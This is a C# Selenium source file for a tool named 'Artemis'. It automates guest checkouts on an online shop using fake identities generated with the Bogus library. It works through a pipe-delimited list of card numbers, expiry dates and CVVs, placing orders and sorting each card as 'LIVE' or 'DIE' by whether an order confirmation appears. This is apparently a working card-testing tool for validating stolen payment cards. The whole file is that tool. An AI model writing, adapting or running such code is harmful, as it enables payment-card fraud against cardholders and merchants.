using Bogus;
using OpenQA.Selenium;
using OpenQA.Selenium.Support.UI;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;

namespace _0lymp.us.Gods
{
    public partial class Artemis : Component
    {
        private static IWebDriver artemis;

        public List<string> CardsList { get; set; }
        public string Url { get; set; }
        private Faker Faker { get; set; }
        private string FirstName { get; set; }
        private string LastName { get; set; }
        private string UserName { get; set; }
        private string Email { get; set; }
        private string Company { get; set; }
        private string Password { get; set; }
        private string Address { get; set; }
        private string Address2 { get; set; }
        private string City { get; set; }
        private string State { get; set; }
        private string Zip { get; set; }
        private string Phone { get; set; }
        private string CCScheme { get; set; }


        public Thread VerifyCardsThread;
        public Thread StateCardsThread;
        public Thread ReduceCardsThread;
        public Thread RefreshProgressThread;

        public delegate void VerifyCardsCompleteHandler();
        public delegate void StateCardsCompleteHandler(string card);
        public delegate void ReduceCardsCompleteHandler(string cards);
        public delegate void RefreshProgressCompleteHandler(int percent, string message, string typeMessage);

        public event VerifyCardsCompleteHandler VerifyCardsComplete;
        public event StateCardsCompleteHandler LiveCardComplete;
        public event StateCardsCompleteHandler DieCardComplete;
        public event ReduceCardsCompleteHandler ReduceCardsComplete;
        public event RefreshProgressCompleteHandler RefreshProgressComplete;

        public Artemis()
        {
            InitializeComponent();
            Faker = new Faker();
        }

        public Artemis(IContainer container)
        {
            container.Add(this);

            InitializeComponent();
        }

        public void VerifyCards()
        {
            FirstName = Faker.Name.FirstName();
            LastName = Faker.Name.LastName();
            Email = Faker.Internet.Email();
            Password = Faker.Internet.Password();
            Address = Faker.Address.StreetAddress();
            Address2 = ((Math.Round(new Random().NextDouble()) == 0.0) ? "" : Faker.Address.SecondaryAddress());
            City = Faker.Address.City();
            State = Faker.Address.State();
            Zip = Faker.Address.ZipCode();
            Phone = Faker.Phone.PhoneNumber("##########");
            Load();
            //artemis.Kill();
            //ExecuteRefreshProgressThread(0, "", "Success");
            //this.VerifyCardsComplete();
        }

        private void Load()
        {
            try
            {
                ExecuteRefreshProgressThread(1, "Cargando ARTEMISA...", "Success");
                artemis = Driver.ChromeNoImage();
                //ares = Driver.Gecko();
                artemis.GoUrl(Url);
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }

            IWebElement webElement = artemis.ElementRandomVisible(By.CssSelector("#mainResultsList > div > div > div.prodict-list.clearfix > article > div > p > a"), "ExceptionLoad");
            if (webElement.IsNotNull())
            {
                DetailProduct(webElement);
            }
            else
            {
                ExecuteRefreshProgressThread(1, "ERROR ARTEMISA #1, Reiniciando proceso...", "Success");
                Restart();
            }
        }

        private void DetailProduct(IWebElement webElement)
        {
            try
            {
                ExecuteRefreshProgressThread(10, "Detalle de Producto", "Success");
                webElement.JsClick();
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }

            IWebElement _webElement = artemis.ElementVisible(By.CssSelector("#autoDelivery > div > button"));

            if (_webElement.IsNotNull())
            {
                AddToCart(_webElement);
            }
            else
            {
                IWebElement __webelement = artemis.ElementTextContains(By.CssSelector("#autoDelivery > div > div > div > div"), "STOCK");
                if (__webelement.IsNotNull())
                {
                    ReturnProductList();
                }
            }
        }

        private void ReturnProductList()
        {
            try
            {
                ExecuteRefreshProgressThread(10, "Regresando a Listado de productos", "Success");
                artemis.Back();
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }

            IWebElement webElement = artemis.ElementRandomVisible(By.CssSelector("#mainResultsList > div > div > div.prodict-list.clearfix > article > div > p > a"), "ExceptionLoad");
            if (webElement.IsNotNull())
            {
                DetailProduct(webElement);
            }
            else
            {
                ExecuteRefreshProgressThread(10, "ERROR ARTEMISA #2, Reiniciando proceso...", "Success");
                Restart();
            }
        }

        private void AddToCart(IWebElement webElement)
        {
            try
            {
                ExecuteRefreshProgressThread(20, "Agregando al Carrito", "Success");
                webElement.JsClick();
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }

            IWebElement _webElement = artemis.ElementVisible(By.CssSelector("#main > div:nth-child(6) > div.col-sm-4 > div:nth-child(1) > a"));

            if (_webElement.IsNotNull())
            {
                ProceedToSecureCheckout(_webElement);
            }
            else
            {
                ExecuteRefreshProgressThread(20, "ERROR ARTEMISA #3, Reiniciando proceso...", "Success");
                Restart();
            }
        }

        private void ProceedToSecureCheckout(IWebElement webElement)
        {
            try
            {
                ExecuteRefreshProgressThread(30, "Proceder a Pago Seguro", "Success");
                webElement.JsClick();
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }

            IWebElement _webElement = artemis.ElementVisible(By.CssSelector("#mainLoginContainerRight > div:nth-child(2) > label"));

            if (_webElement.IsNotNull())
            {
                CheckoutAsAGuest(_webElement);
            }
            else
            {
                ExecuteRefreshProgressThread(30, "ERROR ARTEMISA #4, Reiniciando proceso...", "Success");
                Restart();
            }
        }

        private void CheckoutAsAGuest(IWebElement webElement)
        {
            try
            {
                ExecuteRefreshProgressThread(40, "Procesar pago como invitado", "Success");
                webElement.JsClick();
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }

            IWebElement _webElement = artemis.ElementVisible(By.Id("checkout-email-1"));

            if (_webElement.IsNotNull())
            {
                CheckOutAsGuest(_webElement);
            }
            else{
                ExecuteRefreshProgressThread(30, "ERROR ARTEMISA #5, Reiniciando proceso...", "Success");
                Restart();
            }
        }

        private void CheckOutAsGuest(IWebElement webElement)
        {
            try
            {
                ExecuteRefreshProgressThread(40, "Procesando pago como invitado", "Success");
                webElement.SendKeys(Email);
                artemis.FindElement(By.CssSelector("#checkout-guest-form > div.wl-action.clearfix > button")).JsClick();
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }

            IWebElement _webElement = artemis.ElementVisible(By.Id("inputNameFirst"));

            if (_webElement.IsNotNull())
            {
                ShippingInformation(_webElement);
            }
            else
            {
                ExecuteRefreshProgressThread(40, "ERROR ARTEMISA #6, Reiniciando proceso...", "Success");
                Restart();
            }
        }

        private void ShippingInformation(IWebElement webElement)
        {
            try
            {
                ExecuteRefreshProgressThread(50, "Informacion de Dirección.", "Success");
                webElement.SendKeys(FirstName);
                Thread.Sleep(500);
                artemis.FindElement(By.Id("inputNameLast")).SendKeys(LastName);
                Thread.Sleep(500);
                artemis.FindElement(By.Id("inputAddr")).SendKeys(Address);
                Thread.Sleep(500);
                artemis.FindElement(By.Id("inputAddr2")).SendKeys(Address2);
                Thread.Sleep(500);
                artemis.FindElement(By.Id("inputCity")).SendKeys(City);
                Thread.Sleep(500);
                SelectElement selectState = new SelectElement(artemis.FindElement(By.Id("state")));
                int maxValue = selectState.Options.Count();
                selectState.SelectByIndex(new Random().Next(1, maxValue));
                Thread.Sleep(500);
                artemis.FindElement(By.Id("zip")).SendKeys(Zip);
                Thread.Sleep(500);
                artemis.FindElement(By.Id("inputPhoneNumber")).SendKeys(Phone);
                Thread.Sleep(500);
                artemis.FindElement(By.CssSelector("#collapseTwo > div > div > div.form-horizontal > div:nth-child(4) > div > button")).Click();
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }

            IWebElement _webElement = artemis.ElementVisible(By.CssSelector("#collapseTwo > div > div > div.form-horizontal > div:nth-child(2) > div > div > ul > li:nth-child(1) > button"));

            if (_webElement.IsNotNull())
            {
                AddressVerification(_webElement);
            }
            else
            {
                ExecuteRefreshProgressThread(50, "ERROR ARTEMISA #7, Reiniciando proceso...", "Success");
                Restart();
            }
        }

        private void AddressVerification(IWebElement webElement)
        {
            try
            {
                ExecuteRefreshProgressThread(60, "Verificando Direccion.", "Success");
                webElement.JsClick();
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }

            IWebElement _webElement = artemis.ElementVisible(By.Id("applyShippingMethodsButton"));

            if (_webElement.IsNotNull())
            {
                ShippingMethod(_webElement);
            }
            else
            {
                ExecuteRefreshProgressThread(60, "ERROR ARTEMISA #8, Reiniciando proceso...", "Success");
                Restart();
            }
        }


        private void ShippingMethod(IWebElement webElement)
        {
            try
            {
                ExecuteRefreshProgressThread(70, "Metodo de envio.", "Success");
                webElement.JsClick();
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }

            if (artemis.ElementVisible(By.Id("inputCardNumber")).IsNotNull())
            {
                LastProccess();
            }
            else
            {
                ExecuteRefreshProgressThread(70, "ERROR ARTEMISA #9, Reiniciando proceso...", "Success");
                Restart();
            }
        }

        private void LastProccess()
        {
            try
            {
                int num = 0;
                while (num < CardsList.Count())
                {
                    List<string> list = CardsList[num].Split('|').ToList();
                    if (CardsList.Count() > 1)
                    {
                        CardsList[num] = CardsList[num].Replace("\r", "");
                    }
                    string text = CardsList[num];
                    string cards = CardsList[num].ToString();
                    if (CardsList.Count() > 1)
                    {
                        string text3 = CardsList[num] = (CardsList[num] += "\r");
                        cards = string.Join("", CardsList.ToArray());
                        text += "\r";
                    }
                    PaymentInformation(list[0], list[1], list[2], list[3]);

                    if (Confirmation())
                    {
                        ExecuteReduceCardsThread(cards);
                        ExecuteLiveCardThread(text);
                        CardsList.Remove(CardsList[num]);
                        if (CardsList.Count() > 0)
                        {
                            Restart();
                        }
                    }
                    else
                    {
                        ExecuteReduceCardsThread(cards);
                        ExecuteDieCardThread(text);
                        CardsList.Remove(CardsList[num]);
                        //break;
                    }
                }
            }
            catch (ArgumentOutOfRangeException) { }
        }


        private void PaymentInformation(string number, string month, string year, string cvv)
        {
            try
            {
                ExecuteRefreshProgressThread(80, "Añadiendo tarjeta: " + number, "Success");

                artemis.FindElement(By.Id("inputCardNumber")).SendKeys(number);

                cvv = cvv.Replace("\r", "");
                switch (cvv.Count())
                {
                    case 3:
                        cvv = "000";
                        break;
                    case 4:
                        cvv = "0000";
                        break;
                }

                Thread.Sleep(500);
                new SelectElement(artemis.FindElement(By.Id("eExpirationSelectboxMonth"))).SelectByValue(month);
                Thread.Sleep(500);
                new SelectElement(artemis.FindElement(By.CssSelector("#main > div.express-checkout.col-md-8.col-sm-7.col-xs-12.checkoutContentStick > div.shiping-method > div:nth-child(3) > div > div > div:nth-child(2) > div:nth-child(4) > div > div > div:nth-child(1) > div.panel-collapse > div > div.panel-group > div:nth-child(2) > div.panel-collapse > div > div > div:nth-child(5) > div > div > div:nth-child(2) > select"))).SelectByValue(year.Substring(year.Length - 2));
                Thread.Sleep(500);
                artemis.FindElement(By.Id("saveAsPreferredAddress")).Click();
                Thread.Sleep(500);
                artemis.FindElement(By.Id("sameAsBillingAddress")).Click();
                Thread.Sleep(5000);

                IWebElement _webElement = artemis.ElementVisible(By.CssSelector("#main > div.express-checkout.col-md-8.col-sm-7.col-xs-12.checkoutContentStick > div.shiping-method > div:nth-child(3) > div > div > div:nth-child(2) > div:nth-child(4) > div > div > div:nth-child(1) > div.panel-collapse > div > div.panel-group > div:nth-child(2) > div.panel-collapse > div > div > div:nth-child(4) > div.col-md-2 > input"));
                if (_webElement.IsNotNull())
                {
                    for (int i = 0; i < cvv.Length; i++)
                    {
                        _webElement.SendKeys(cvv.Substring(i, 1));
                        Thread.Sleep(300);
                    }
                }
                Thread.Sleep(500);
                artemis.FindElement(By.CssSelector("#main > div.express-checkout.col-md-8.col-sm-7.col-xs-12.checkoutContentStick > div.shiping-method > div:nth-child(3) > div > div > div:nth-child(2) > div:nth-child(4) > div > div > div:nth-child(1) > div.panel-collapse > div > div.panel-group > div:nth-child(2) > div.panel-collapse > div > div > div.form-group.m-t-30 > div > button")).Click();


            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }

            IWebElement webElement = artemis.ElementVisible(By.CssSelector("button.wl-button.btn-primary.placeOrderBtn"));

            if (webElement.IsNotNull())
            {
                Thread.Sleep(3000);
                Order(webElement);
            }
            else
            {
                ExecuteRefreshProgressThread(80, "ERROR ARTEMISA #10, Reiniciando proceso...", "Success");
                Restart();
            }
        }

        private void Order(IWebElement webElement)
        {
            try
            {
                ExecuteRefreshProgressThread(80, "Validando Orden", "Success");
                webElement.Click();
            }
            catch (NoSuchElementException) {/* throw; */}
            catch (StaleElementReferenceException) {/* throw; */}
            catch (WebDriverException) {/* throw;*/ }
            catch (NullReferenceException) {/* throw;*/ }

            Thread.Sleep(3000);

        }

        private bool Confirmation()
        {
            ExecuteRefreshProgressThread(90, "Confirmando.", "Success");
            //Thread.Sleep(2000);
            IWebElement webElement = artemis.ElementTextContains(By.CssSelector("#main > div:nth-child(5) > aside > div.wl-message-error.wl-message.hidden-xs > p"), "sorry", "DIE");

            if (webElement.IsNotNull())
            {
                ExecuteRefreshProgressThread(100, "DIE.", "Success");
                PreparedNewCard();
                return false;
            }
            else
            {
                IWebElement webElement2 = artemis.ElementTextEquals(By.CssSelector("#main > div.col-md-8.col-sm-7.col-xs-12 > h2"), "Order Confirmation", "LIVE");
                if (webElement2.IsNotNull())
                {
                    ExecuteRefreshProgressThread(100, "LIVE.", "Success");
                    return true;
                }
                else
                {
                    ExecuteRefreshProgressThread(100, "ERROR ARTEMISA #11, Reiniciando proceso...", "Success");
                    Restart();
                }

            }
            return false;
        }


        private void PreparedNewCard()
        {
            try
            {
                Thread.Sleep(3000);
                artemis.ElementVisible(By.CssSelector("#main > div.express-checkout.col-md-8.col-sm-7.col-xs-12.checkoutContentStick > div.shiping-method > div:nth-child(3) > div > div > div:nth-child(1) > h3 > a")).Click();
                Thread.Sleep(500);
                artemis.ElementVisible(By.Id("enter-new-credit-card")).Click();
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }

        }

        private void Restart()
        {
            artemis.Kill();
            VerifyCards();
        }

        public void ExecuteThread()
        {
            VerifyCardsThread = new Thread(VerifyCards);
            VerifyCardsThread.Start();
        }

        private void ExecuteRefreshProgressThread(int percent, string message, string typeMessage)
        {
            RefreshProgressThread = new Thread((ThreadStart)delegate
            {
                RefreshProgress(percent, message, typeMessage);
            });
            RefreshProgressThread.Start();
        }

        public void KillThread()
        {
            try
            {
                ExecuteRefreshProgressThread(0, "", "Success");
                VerifyCardsThread.Abort();
                VerifyCardsThread.Join();
                artemis.Kill();
            }
            catch (NullReferenceException)
            {
            }
        }

        private void ExecuteLiveCardThread(string card)
        {
            StateCardsThread = new Thread((ThreadStart)delegate
            {
                LiveCard(card);
            });
            StateCardsThread.Start();
        }

        public void KillLiveCardThread()
        {
            try
            {
                StateCardsThread.Abort();
                StateCardsThread.Join();
            }
            catch (NullReferenceException)
            {
            }
        }

        private void ExecuteDieCardThread(string card)
        {
            StateCardsThread = new Thread((ThreadStart)delegate
            {
                DieCard(card);
            });
            StateCardsThread.Start();
        }

        public void KillDieCardThread()
        {
            try
            {
                StateCardsThread.Abort();
                StateCardsThread.Join();
            }
            catch (NullReferenceException)
            {
            }
        }

        private void ExecuteReduceCardsThread(string cards)
        {
            ReduceCardsThread = new Thread((ThreadStart)delegate
            {
                ReduceCards(cards);
            });
            ReduceCardsThread.Start();
        }

        public void KillReduceCardsThread()
        {
            try
            {
                ReduceCardsThread.Abort();
                ReduceCardsThread.Join();
            }
            catch (NullReferenceException)
            {
            }
        }
        private void RefreshProgress(int percent, string message, string typeMessage)
        {
            try
            {
                string messageLoad = "";
                for (int i = 0; i < 3; i++)
                {
                    messageLoad += ".";
                    this.RefreshProgressComplete(percent, message + messageLoad, typeMessage);
                    Thread.Sleep(500);
                }
            }
            catch (NullReferenceException) { /*throw;*/ }
        }

        public void ReduceCards(string cards)
        {
            this.ReduceCardsComplete(cards);
        }

        private void LiveCard(string card)
        {
            this.LiveCardComplete(card);
        }

        private void DieCard(string card)
        {
            this.DieCardComplete(card);
        }
    }
}
